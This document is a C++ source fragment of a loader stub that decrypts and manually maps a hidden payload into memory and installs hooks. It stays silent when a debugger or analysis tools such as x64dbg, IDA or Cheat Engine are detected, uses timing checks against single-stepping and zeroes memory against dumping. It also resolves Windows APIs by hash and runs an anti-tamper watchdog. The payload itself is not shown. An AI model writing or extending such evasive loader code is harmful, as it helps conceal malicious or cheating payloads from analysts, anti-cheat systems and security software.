bool StubLoadAndRunPayload(HINSTANCE self) {
    if (StubDebuggerPresent()) return false;  // under a debugger: silent
    // F2: analysis tools open (x64dbg/CE/IDA/windbg) = silent.
    if (antidebug::AnalysisToolRunning()) return false;

    MapperParams params = {};
    uint32_t size1 = 0;
    uint8_t* blob1 = ReadBlob1(self, &params, &size1);
    if (blob1 == nullptr) return false;

    // F2: timing around the decryption (single-step blows the budget).
    params.kill_flag = &g_kill;
    const uint64_t t0 = antidebug::Tsc();
    DecryptBlob1(blob1, size1);
    if (antidebug::RegionTooSlow(t0, antidebug::kSlowBudgetCycles)) {
        std::memset(blob1, 0, size1);
        apihash::VirtualFree()(blob1, 0, MEM_RELEASE);
        return false;  // stepping suspicion: silent
    }
    // The mapper (BLOB1) runs inside here: decrypts BLOB2, maps the payload
    // and installs the hook. lpReserved = &params (the blob CRT passes it
    // through). If the mapper detects something (2nd layer) it returns FALSE ->
    // MiniLoadAndRun returns nullptr -> silent failure here.
    uint8_t* mapped = miniloader::MiniLoadAndRun(blob1, size1, Crc(), &params);
    // anti-dump: zeroes the decrypted staging before freeing.
    std::memset(blob1, 0, size1);
    apihash::VirtualFree()(blob1, 0, MEM_RELEASE);
    if (mapped == nullptr) return false;

    // ---- F2 anti-dump: the mapper (mapped image) carries the payload keys
    // IN THE CLEAR in .rdata/.text. After its DllMain ran, the mapper image is
    // dead code -> free it. Only the payload remains in memory (mandatory: it
    // is what runs the hooks) + the stub.
    g_payloadBase = reinterpret_cast<uintptr_t>(params.mapped_payload);
    apihash::VirtualFree()(mapped, 0, MEM_RELEASE);

    // Snapshots for the watchdog (CRC of the .text IN MEMORY, post-load).
    g_selfBase = reinterpret_cast<uintptr_t>(self);
    g_stubTextSnap = MemTextCrc(g_selfBase);
    g_payTextSnap = MemTextCrc(g_payloadBase);

    // Post-load anti-tamper watchdog (light thread, dies with the process).
    HANDLE wd = apihash::CreateThread()(nullptr, 0, &WatchdogMain, nullptr, 0,
                                        nullptr);
    if (wd != nullptr) apihash::CloseHandle()(wd);
    return true;
}

